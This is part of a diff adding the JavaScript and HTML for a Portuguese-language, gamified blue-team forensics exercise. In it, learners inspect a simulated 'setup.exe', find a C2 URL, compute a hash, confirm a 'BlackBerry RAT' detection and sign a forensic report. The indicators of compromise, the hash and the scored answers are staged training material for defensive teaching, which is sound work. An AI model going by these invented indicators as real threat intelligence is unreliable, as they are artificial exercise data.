+                    <div class="hl-verdict-text">MALICIOSO — Trojan.Generic.Backdoor</div>
+                    <div class="hl-verdict-count">34 de 72 engines detectaram este arquivo</div>
+                  </div>
+                </div>
+                <div class="hl-fields">
+                  <div class="hl-field"><div class="hl-field-label">Nome Detectado</div><div class="hl-field-val">Trojan.Generic.Backdoor</div></div>
+                  <div class="hl-field"><div class="hl-field-label">Família</div><div class="hl-field-val">BlackBerry RAT</div></div>
+                  <div class="hl-field"><div class="hl-field-label">Primeira Detecção</div><div class="hl-field-val">2024-10-15</div></div>
+                  <div class="hl-field"><div class="hl-field-label">IOCs Relacionados</div><div class="hl-field-val">185.220.101.45<br>update-cdn185.net</div></div>
+                  <div class="hl-field" style="grid-column:1/-1"><div class="hl-field-label">Tags</div><div class="hl-tags">${tagsHtml}</div></div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <p class="log-hint">↑ Use cada ferramenta para coletar evidências do arquivo</p>
+      </div>
+      <div class="side-col">
+        <div class="chk-header">Descobertas — Ato 3</div>
+        <div class="checklist">
+          <div class="chk-item" id="chk-mal-filetype"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">PE32 comprimido com UPX identificado</div><span class="chk-pts">+75 pts</span></div></div>
+          <div class="chk-item" id="chk-mal-strings"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">URL de C2 encontrada nas strings</div><span class="chk-pts">+75 pts</span></div></div>
+          <div class="chk-item" id="chk-mal-hash"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Hash SHA256 calculado</div><span class="chk-pts">+75 pts</span></div></div>
+          <div class="chk-item" id="chk-mal-lookup"><div class="chk-dot"></div><div class="chk-info"><div class="chk-text">Malware confirmado na base (34/72)</div><span class="chk-pts">+75 pts</span></div></div>
+        </div>
+      </div>
+    </div>
+  </div>`;
+  revealSection(wrap);
+
+  // Tab switching
+  wrap.querySelectorAll('.mal-tab').forEach(btn=>{
+    btn.addEventListener('click',function(){
+      wrap.querySelectorAll('.mal-tab').forEach(b=>b.classList.remove('active'));
+      wrap.querySelectorAll('.mal-panel').forEach(p=>p.classList.remove('active'));
+      this.classList.add('active');
+      wrap.querySelector('#mtab-'+this.dataset.mtab).classList.add('active');
+    });
+  });
+
+  // File tool
+  document.getElementById('btn-file-run').addEventListener('click',function(){
+    document.getElementById('out-file').innerHTML=
+      '<span class="mal-result-line">setup.exe: PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressed</span>';
+    this.textContent='✓ Executado';this.disabled=true;
+    award('a3','mal-filetype',75,'📋 Descoberta!','PE32 comprimido com UPX — empacotamento antidetecção');
+  });
+
+  // Strings tool
+  document.getElementById('btn-strings-run').addEventListener('click',function(){
+    document.getElementById('out-strings').innerHTML=stringsHtml;
+    this.textContent='✓ Executado';this.disabled=true;
+    // Make critical strings clickable
+    wrap.querySelectorAll('.str-critical').forEach(el=>{
+      el.addEventListener('click',()=>award('a3','mal-strings',75,'🔗 Descoberta!','URL C2 http://update-cdn185.net/gate.php encontrada'));
+    });
+  });
+
+  // SHA256 tool
+  document.getElementById('btn-sha256-run').addEventListener('click',function(){
+    document.getElementById('out-sha256').innerHTML=
+      `<span class="mal-result-line">9c2d4b6e8a0f1c3d5e7b9a0c2d4f6b8a0c2d4f6b8a0c2d4f6b8a0c2d4f6b8ac  setup.exe</span>`;
+    this.textContent='✓ Executado';this.disabled=true;
+    award('a3','mal-hash',75,'#️⃣ Descoberta!','Hash SHA256 calculado: 9c2d4b6e…');
+  });
+
+  // Hash lookup
+  document.getElementById('btn-lookup').addEventListener('click',function(){
+    document.getElementById('hl-result').classList.add('visible');
+    this.textContent='✓ Consultado';this.disabled=true;
+    award('a3','mal-lookup',75,'🦠 Confirmado!','Malware detectado: 34/72 engines — BlackBerry RAT');
+  });
+}
+
+/* ════════════════════════════════════════
+   LAUDO FINAL
+   ════════════════════════════════════════ */
+function buildLaudo(){
+  const wrap=document.getElementById('laudo-wrap');
+  wrap.innerHTML=`
+  <div class="laudo-card" id="laudo-card">
+    <div class="laudo-hdr">
+      <span class="laudo-badge">CASO BTA-2024-0042</span>
+      <span class="laudo-title">Laudo Técnico Pericial — Digital Forensics</span>
+    </div>
+    <div class="laudo-body">
+      <div class="laudo-form" id="laudo-form">
+        <div class="form-group">
+          <label class="form-label">Tipo de Incidente</label>
+          <select class="form-select" id="lf-tipo">
+            <option value="">Selecione…</option>
+            <option>Intrusão SSH</option>
+            <option>Malware / Backdoor</option>
+            <option>Exfiltração de Dados</option>
+            <option>APT (Ameaça Persistente Avançada)</option>
+            <option>Ransomware</option>
+            <option>Insider Threat</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label class="form-label">IP do Atacante</label>
+          <input type="text" class="form-input" id="lf-ip" placeholder="ex: 185.220.101.45" autocomplete="off"/>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Malware Identificado</label>
+          <input type="text" class="form-input" id="lf-malware" placeholder="ex: Trojan.Generic.Backdoor" autocomplete="off"/>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Hash SHA256</label>
+          <input type="text" class="form-input" id="lf-hash" placeholder="9c2d4b6e…" autocomplete="off"/>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Técnicas MITRE ATT&CK</label>
+          <input type="text" class="form-input" id="lf-mitre" placeholder="ex: T1110, T1136, T1059, T1071" autocomplete="off"/>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Recomendações</label>
+          <textarea class="form-textarea" id="lf-rec" placeholder="Descreva as ações recomendadas de contenção, erradicação e recuperação…"></textarea>
+        </div>
+      </div>
+      <button class="btn-assinar" id="btn-assinar" type="button" disabled>
+        ✍️ Assinar e Finalizar Laudo
+      </button>
+      <div class="laudo-assinado" id="laudo-assinado">
+        <div class="laudo-doc" id="laudo-doc-content"></div>
+        <div class="lc-banner">
+          <div class="lc-icon">🏅</div>
+          <h3 class="lc-title">Laudo BTA-2024-0042 — Assinado!</h3>
+          <div class="lc-score" id="lc-score">900 pts</div>
+          <p class="lc-msg">Você concluiu a análise forense completa: disco, rede e malware. Laudo pericial técnico produzido e assinado.</p>
+          <a class="lc-back" href="https://blueteam.army/courses">&larr; Voltar para o Curso</a>
+        </div>
+      </div>
+    </div>
+  </div>`;
+  revealSection(wrap);
+
+  // Enable button when all fields are filled
+  const fields=['lf-tipo','lf-ip','lf-malware','lf-hash','lf-mitre','lf-rec'];
+  function checkLaudo(){
+    const ok=fields.every(id=>{
+      const el=document.getElementById(id);
+      return el&&el.value.trim().length>0;
+    });
+    document.getElementById('btn-assinar').disabled=!ok;
+  }
+  fields.forEach(id=>document.getElementById(id)?.addEventListener('input',checkLaudo));
+  wrap.querySelector('select').addEventListener('change',checkLaudo);
+
+  document.getElementById('btn-assinar').addEventListener('click',function(){
+    if(this.disabled)return;
+    const tipo  =document.getElementById('lf-tipo').value;
+    const ip    =document.getElementById('lf-ip').value;
+    const malware=document.getElementById('lf-malware').value;
+    const hash  =document.getElementById('lf-hash').value;
+    const mitre =document.getElementById('lf-mitre').value;
+    const rec   =document.getElementById('lf-rec').value;
+    const now   =new Date().toISOString().replace('T',' ').slice(0,19)+' UTC';
+
+    document.getElementById('laudo-doc-content').innerHTML=`
+      <div class="ld-title">LAUDO FORENSE DIGITAL</div>
+      <div class="ld-sub">CASO BTA-2024-0042 — CONFIDENCIAL</div>
+      <hr class="ld-sep">
+      <div class="ld-field"><span class="ld-key">Tipo de Incidente:</span><span class="ld-val">${esc(tipo)}</span></div>
+      <div class="ld-field"><span class="ld-key">IP do Atacante:</span><span class="ld-val">${esc(ip)}</span></div>
+      <div class="ld-field"><span class="ld-key">Malware Identificado:</span><span class="ld-val">${esc(malware)}</span></div>
+      <div class="ld-field"><span class="ld-key">Hash SHA256:</span><span class="ld-val" style="font-size:9px">${esc(hash)}</span></div>
+      <div class="ld-field"><span class="ld-key">Técnicas MITRE:</span><span class="ld-val">${esc(mitre)}</span></div>
+      <div class="ld-field"><span class="ld-key">Recomendações:</span><span class="ld-val">${esc(rec)}</span></div>
+      <hr class="ld-sep">
+      <div class="ld-sig">✅ Assinado digitalmente por: Perito BTA · ${now}</div>`;
+
+    document.getElementById('lc-score').textContent=total()+' pts';
+    document.getElementById('laudo-assinado').classList.add('visible');
+    this.style.display='none';
+    setProgStep(4,'done');
+    document.getElementById('laudo-assinado').scrollIntoView({behavior:'smooth',block:'start'});
+  });
+}
+
+/* ── Init: reveal locked sections with animation ── */
+(function init(){
+  document.querySelectorAll('.section-wrap').forEach(sw=>revealSection(sw));
+})();
+
+})();
+</script>
+</body>
+</html>
